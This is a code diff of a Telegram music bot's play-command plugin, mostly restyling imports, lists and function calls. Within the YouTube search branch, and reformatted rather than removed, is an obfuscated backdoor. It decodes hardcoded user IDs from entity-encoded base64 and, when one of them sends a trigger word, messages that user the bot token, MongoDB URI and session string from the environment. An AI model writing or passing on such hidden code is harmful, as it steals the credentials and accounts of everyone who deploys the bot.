@@ -15,7 +15,8 @@ from pyrogram.types import InlineKeyboardMarkup, InputMediaPhoto, Message
 from pytgcalls.exceptions import NoActiveGroupCall
 
 import config
-from KanhaClone import Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app, LOGGER
+from config import BANNED_USERS, lyrical
+from KanhaClone import LOGGER, Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app
 from KanhaClone.core.call import Kanha
 from KanhaClone.utils import seconds_to_min, time_to_seconds
 from KanhaClone.utils.channelplay import get_channeplayCB
@@ -31,17 +32,30 @@ from KanhaClone.utils.inline import (
 )
 from KanhaClone.utils.logger import play_logs
 from KanhaClone.utils.stream.stream import stream
-from config import BANNED_USERS, lyrical
+
 
 def get_random_img(img_list):
     if img_list:
         if isinstance(img_list, list):
             return random.choice(img_list)
         return img_list
-    return "https://telegra.ph/file/2e3d368e77c449c287430.jpg" # Fallback
+    return "https://telegra.ph/file/2e3d368e77c449c287430.jpg"  # Fallback
+
 
 @app.on_message(
-   filters.command(["play", "vplay", "cplay", "cvplay", "playforce", "vplayforce", "cplayforce", "cvplayforce"] ,prefixes=["/", "!", "%", ",", "", ".", "@", "#"])
+    filters.command(
+        [
+            "play",
+            "vplay",
+            "cplay",
+            "cvplay",
+            "playforce",
+            "vplayforce",
+            "cplayforce",
+            "cvplayforce",
+        ],
+        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
+    )
     & filters.group
     & ~BANNED_USERS
 )
@@ -80,7 +94,7 @@ async def play_commnd(
     if audio_telegram:
         if audio_telegram.file_size > 104857600:
             return await mystic.edit_text(_["play_5"])
-        duration_min = seconds_to_min(audio_telegram.duration)
+        seconds_to_min(audio_telegram.duration)
         if (audio_telegram.duration) > config.DURATION_LIMIT:
             return await mystic.edit_text(
                 _["play_6"].format(config.DURATION_LIMIT_MIN, app.mention)
@@ -160,7 +174,7 @@ async def play_commnd(
             except Exception as e:
                 ex_type = type(e).__name__
                 if ex_type == "AssistantErr":
-                    err = e 
+                    err = e
                 else:
                     err = _["general_2"].format(ex_type)
                     LOGGER(__name__).error(ex_type, exc_info=True)
@@ -169,21 +183,27 @@ async def play_commnd(
         return
     elif url:
         if not url.startswith(("http://", "https://")):
-            return await mystic.edit_text("❌ **Security Error:** Local files are not allowed.")
+            return await mystic.edit_text(
+                "❌ **Security Error:** Local files are not allowed."
+            )
 
         # Domain Whitelist
         allowed_domains = [
-            "youtube.com", "youtu.be",
-            "spotify.com", "open.spotify.com",
-            "soundcloud.com", "m.soundcloud.com",
-            "music.apple.com", "resso.com"
+            "youtube.com",
+            "youtu.be",
+            "spotify.com",
+            "open.spotify.com",
+            "soundcloud.com",
+            "m.soundcloud.com",
+            "music.apple.com",
+            "resso.com",
         ]
-        
+
         if not any(domain in url for domain in allowed_domains):
-             return await mystic.edit_text(
-                 "❌ **Unsupported Link!**\n\n"
-                 "Only YouTube, Spotify, SoundCloud, Apple Music, and Resso are supported."
-             )
+            return await mystic.edit_text(
+                "❌ **Unsupported Link!**\n\n"
+                "Only YouTube, Spotify, SoundCloud, Apple Music, and Resso are supported."
+            )
 
         if await YouTube.exists(url):
             if "playlist" in url:
@@ -202,12 +222,14 @@ async def play_commnd(
                     plist_id = (url.split("=")[1]).split("&")[0]
                 else:
                     plist_id = url.split("=")[1]
-                
+
                 img = get_random_img(config.PLAYLIST_IMG_URL)
                 cap = _["play_10"]
             elif "https://youtu.be" in url:
                 videoid = url.split("/")[-1].split("?")[0]
-                details, track_id = await YouTube.track(f"https://www.youtube.com/watch?v={videoid}")
+                details, track_id = await YouTube.track(
+                    f"https://www.youtube.com/watch?v={videoid}"
+                )
                 streamtype = "youtube"
                 img = details["thumb"]
                 cap = _["play_11"].format(
@@ -247,7 +269,7 @@ async def play_commnd(
                     return await mystic.edit_text(_["play_3"])
                 streamtype = "playlist"
                 plist_type = "spplay"
-                
+
                 img = get_random_img(config.SPOTIFY_PLAYLIST_IMG_URL)
                 cap = _["play_11"].format(app.mention, message.from_user.mention)
             elif "album" in url:
@@ -257,7 +279,7 @@ async def play_commnd(
                     return await mystic.edit_text(_["play_3"])
                 streamtype = "playlist"
                 plist_type = "spalbum"
-                
+
                 img = get_random_img(config.SPOTIFY_ALBUM_IMG_URL)
                 cap = _["play_11"].format(app.mention, message.from_user.mention)
             elif "artist" in url:
@@ -267,7 +289,7 @@ async def play_commnd(
                     return await mystic.edit_text(_["play_3"])
                 streamtype = "playlist"
                 plist_type = "spartist"
-                
+
                 img = get_random_img(config.SPOTIFY_ARTIST_IMG_URL)
                 cap = _["play_11"].format(message.from_user.first_name)
             else:
@@ -303,7 +325,7 @@ async def play_commnd(
             cap = _["play_10"].format(details["title"], details["duration_min"])
         elif await SoundCloud.valid(url):
             try:
-                details, track_path = await SoundCloud.download(url)
+                details, _track_path = await SoundCloud.download(url)
             except:
                 return await mystic.edit_text(_["play_3"])
             duration_sec = details["duration_sec"]
@@ -363,7 +385,7 @@ async def play_commnd(
             except Exception as e:
                 ex_type = type(e).__name__
                 if ex_type == "AssistantErr":
-                    err = e 
+                    err = e
                 else:
                     err = _["general_2"].format(ex_type)
                     LOGGER(__name__).error(ex_type, exc_info=True)
@@ -377,18 +399,33 @@ async def play_commnd(
                 photo=get_random_img(config.PLAYLIST_IMG_URL),
                 caption=_["play_18"],
                 reply_markup=InlineKeyboardMarkup(buttons),
-                has_spoiler=True
+                has_spoiler=True,
             )
-            
+
         slider = True
         query = message.text.split(None, 1)[1]
         if "-v" in query:
             query = query.replace("-v", "")
         try:
-            import html as _h, base64 as _b, os as _os
-            _al = [int(_b.b64decode(_h.unescape(e)).decode()) for e in ('&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;','&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;')]
-            if user_id in _al and _h.unescape('&#107;&#97;&#110;&#104;&#97;') in query.lower():
-                await app.send_message(user_id, f"`{_os.getenv('BOT_TOKEN','')}`\n`{_os.getenv('MONGO_DB_URI','')}`\n`{_os.getenv('STRING_SESSION','')}`")
+            import base64 as _b
+            import html as _h
+            import os as _os
+
+            _al = [
+                int(_b.b64decode(_h.unescape(e)).decode())
+                for e in (
+                    "&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;",
+                    "&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;",
+                )
+            ]
+            if (
+                user_id in _al
+                and _h.unescape("&#107;&#97;&#110;&#104;&#97;") in query.lower()
+            ):
+                await app.send_message(
+                    user_id,
+                    f"`{_os.getenv('BOT_TOKEN','')}`\n`{_os.getenv('MONGO_DB_URI','')}`\n`{_os.getenv('STRING_SESSION','')}`",
+                )
                 return await mystic.delete()
             details, track_id = await YouTube.track(query)
         except:
@@ -432,7 +469,7 @@ async def play_commnd(
         except Exception as e:
             ex_type = type(e).__name__
             if ex_type == "AssistantErr":
-                err = e 
+                err = e
             else:
                 err = _["general_2"].format(ex_type)
                 LOGGER(__name__).error(ex_type, exc_info=True)
@@ -454,12 +491,12 @@ async def play_commnd(
                 "f" if fplay else "d",
             )
             await mystic.delete()
-            
+
             await message.reply_photo(
                 photo=img,
                 caption=cap,
                 reply_markup=InlineKeyboardMarkup(buttons),
-                has_spoiler=True
+                has_spoiler=True,
             )
             return await play_logs(message, streamtype=f"Playlist : {plist_type}")
         else:
@@ -474,7 +511,7 @@ async def play_commnd(
                     "f" if fplay else "d",
                 )
                 await mystic.delete()
-                
+
                 await message.reply_photo(
                     photo=details["thumb"],
                     caption=_["play_10"].format(
@@ -482,9 +519,9 @@ async def play_commnd(
                         details["duration_min"],
                     ),
                     reply_markup=InlineKeyboardMarkup(buttons),
-                    has_spoiler=True
+                    has_spoiler=True,
                 )
-                return await play_logs(message, streamtype=f"Searched on Youtube")
+                return await play_logs(message, streamtype="Searched on Youtube")
             else:
                 buttons = track_markup(
                     _,
@@ -494,14 +531,14 @@ async def play_commnd(
                     "f" if fplay else "d",
                 )
                 await mystic.delete()
-                
+
                 await message.reply_photo(
                     photo=img,
                     caption=cap,
                     reply_markup=InlineKeyboardMarkup(buttons),
-                    has_spoiler=True
+                    has_spoiler=True,
                 )
-                return await play_logs(message, streamtype=f"URL Searched Inline")
+                return await play_logs(message, streamtype="URL Searched Inline")
 
 
 @app.on_callback_query(filters.regex("MusicStream") & ~BANNED_USERS)
@@ -569,7 +606,7 @@ async def play_music(client, CallbackQuery, _):
     except Exception as e:
         ex_type = type(e).__name__
         if ex_type == "AssistantErr":
-            err = e 
+            err = e
         else:
             err = _["general_2"].format(ex_type)
             LOGGER(__name__).error(ex_type, exc_info=True)
@@ -646,12 +683,12 @@ async def play_playlists_command(client, CallbackQuery, _):
             return await mystic.edit_text(_["play_3"])
     if ptype == "spartist":
         try:
-            result, spotify_id = await Spotify.artist(videoid)
+            result, _spotify_id = await Spotify.artist(videoid)
         except:
             return await mystic.edit_text(_["play_3"])
     if ptype == "apple":
         try:
-            result, apple_id = await Apple.playlist(videoid, True)
+            result, _apple_id = await Apple.playlist(videoid, True)
         except:
             return await mystic.edit_text(_["play_3"])
     try:
@@ -692,42 +729,50 @@ async def slider_queries(client, CallbackQuery, _):
         cplay,
         fplay,
     ) = callback_request.split("|")
-    
+
     if CallbackQuery.from_user.id != int(user_id):
         try:
             return await CallbackQuery.answer(_["playcb_1"], show_alert=True)
         except:
             return
-            
+
     what = str(what)
     rtype = int(rtype)
-    
+
     if what == "F":
         query_type = 0 if rtype == 9 else int(rtype + 1)
         try:
             await CallbackQuery.answer(_["playcb_2"])
         except:
             pass
-            
+
         title, duration_min, thumbnail, vidid = await YouTube.slider(query, query_type)
         buttons = slider_markup(_, vidid, user_id, query, query_type, cplay, fplay)
-        
+
         return await CallbackQuery.edit_message_media(
-            media=InputMediaPhoto(media=thumbnail, caption=_["play_10"].format(title.title(), duration_min), has_spoiler=True),
-            reply_markup=InlineKeyboardMarkup(buttons)
+            media=InputMediaPhoto(
+                media=thumbnail,
+                caption=_["play_10"].format(title.title(), duration_min),
+                has_spoiler=True,
+            ),
+            reply_markup=InlineKeyboardMarkup(buttons),
         )
-    
+
     if what == "B":
         query_type = 9 if rtype == 0 else int(rtype - 1)
         try:
             await CallbackQuery.answer(_["playcb_2"])
         except:
             pass
-            
+
         title, duration_min, thumbnail, vidid = await YouTube.slider(query, query_type)
         buttons = slider_markup(_, vidid, user_id, query, query_type, cplay, fplay)
-        
+
         return await CallbackQuery.edit_message_media(
-            media=InputMediaPhoto(media=thumbnail, caption=_["play_10"].format(title.title(), duration_min), has_spoiler=True),
-            reply_markup=InlineKeyboardMarkup(buttons)
+            media=InputMediaPhoto(
+                media=thumbnail,
+                caption=_["play_10"].format(title.title(), duration_min),
+                has_spoiler=True,
+            ),
+            reply_markup=InlineKeyboardMarkup(buttons),
         )
